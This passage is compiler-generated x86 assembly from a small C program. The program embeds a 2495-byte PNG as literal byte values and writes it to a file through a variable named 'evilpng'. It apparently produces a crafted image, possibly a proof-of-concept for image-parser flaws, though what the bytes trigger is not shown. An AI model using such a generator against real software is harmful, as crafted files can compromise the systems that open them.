	mov	BYTE PTR _png$[ebp+2307], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+2308], 87		; 00000057H
	mov	BYTE PTR _png$[ebp+2309], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+2310], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+2311], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+2312], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+2313], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2314], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+2315], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+2316], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+2317], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+2318], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+2319], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+2320], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+2321], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+2322], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+2323], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+2324], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+2325], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+2326], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+2327], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+2328], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+2329], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+2330], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+2331], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+2332], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+2333], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+2334], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+2335], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+2336], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+2337], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+2338], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+2339], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+2340], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+2341], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+2342], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+2343], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+2344], -1
	mov	BYTE PTR _png$[ebp+2345], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+2346], -68		; ffffffbcH
	mov	BYTE PTR _png$[ebp+2347], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+2348], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+2349], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+2350], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+2351], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+2352], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+2353], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+2354], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+2355], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+2356], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+2357], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+2358], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+2359], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+2360], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+2361], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+2362], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+2363], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+2364], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+2365], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+2366], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+2367], -1
	mov	BYTE PTR _png$[ebp+2368], -3		; fffffffdH
	mov	BYTE PTR _png$[ebp+2369], 33		; 00000021H
	mov	BYTE PTR _png$[ebp+2370], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+2371], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+2372], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+2373], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+2374], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2375], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+2376], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+2377], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+2378], -120		; ffffff88H
	mov	BYTE PTR _png$[ebp+2379], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+2380], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+2381], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+2382], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+2383], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+2384], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+2385], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+2386], -1
	mov	BYTE PTR _png$[ebp+2387], -81		; ffffffafH
	mov	BYTE PTR _png$[ebp+2388], -80		; ffffffb0H
	mov	BYTE PTR _png$[ebp+2389], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+2390], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+2391], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+2392], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+2393], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+2394], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+2395], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+2396], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+2397], 46		; 0000002eH
	mov	BYTE PTR _png$[ebp+2398], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+2399], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+2400], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+2401], -12		; fffffff4H
	mov	BYTE PTR _png$[ebp+2402], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+2403], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+2404], -1
	mov	BYTE PTR _png$[ebp+2405], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+2406], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+2407], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+2408], 126		; 0000007eH
	mov	BYTE PTR _png$[ebp+2409], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+2410], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+2411], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+2412], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+2413], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+2414], 121		; 00000079H
	mov	BYTE PTR _png$[ebp+2415], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+2416], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+2417], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+2418], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+2419], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+2420], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+2421], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+2422], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+2423], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+2424], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+2425], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+2426], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+2427], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+2428], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+2429], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+2430], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+2431], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+2432], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+2433], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+2434], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+2435], 119		; 00000077H
	mov	BYTE PTR _png$[ebp+2436], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+2437], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2438], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+2439], 87		; 00000057H
	mov	BYTE PTR _png$[ebp+2440], 119		; 00000077H
	mov	BYTE PTR _png$[ebp+2441], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+2442], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+2443], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+2444], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+2445], -14		; fffffff2H
	mov	BYTE PTR _png$[ebp+2446], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+2447], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+2448], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+2449], 124		; 0000007cH
	mov	BYTE PTR _png$[ebp+2450], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+2451], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+2452], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+2453], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+2454], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+2455], 63		; 0000003fH
	mov	BYTE PTR _png$[ebp+2456], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+2457], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+2458], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+2459], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+2460], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+2461], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+2462], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+2463], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+2464], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+2465], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+2466], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+2467], -13		; fffffff3H
	mov	BYTE PTR _png$[ebp+2468], -27		; ffffffe5H
	mov	BYTE PTR _png$[ebp+2469], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+2470], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+2471], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+2472], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+2473], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+2474], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+2475], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+2476], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+2477], 9
	mov	BYTE PTR _png$[ebp+2478], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+2479], -81		; ffffffafH
	mov	BYTE PTR _png$[ebp+2480], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+2481], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+2482], 0
	mov	BYTE PTR _png$[ebp+2483], 0
	mov	BYTE PTR _png$[ebp+2484], 0
	mov	BYTE PTR _png$[ebp+2485], 0
	mov	BYTE PTR _png$[ebp+2486], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+2487], 69		; 00000045H
	mov	BYTE PTR _png$[ebp+2488], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+2489], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+2490], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+2491], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+2492], 96		; 00000060H
	mov	BYTE PTR _png$[ebp+2493], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+2494], 0
; Line 208
	push	OFFSET $SG11608
	mov	eax, DWORD PTR _evilpng$[ebp]
	push	eax
	call	_fopen
	add	esp, 8
	mov	DWORD PTR _winpng$[ebp], eax
; Line 210
	mov	ecx, DWORD PTR _winpng$[ebp]
	push	ecx
	push	1
	push	2495					; 000009bfH
	lea	edx, DWORD PTR _png$[ebp]
	push	edx
	call	_fwrite
	add	esp, 16					; 00000010H
; Line 212
	mov	eax, DWORD PTR _winpng$[ebp]
	push	eax
	call	_fclose
	add	esp, 4
; Line 214
	push	OFFSET $SG11609
	call	_printf
	add	esp, 4
; Line 215
	xor	eax, eax
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
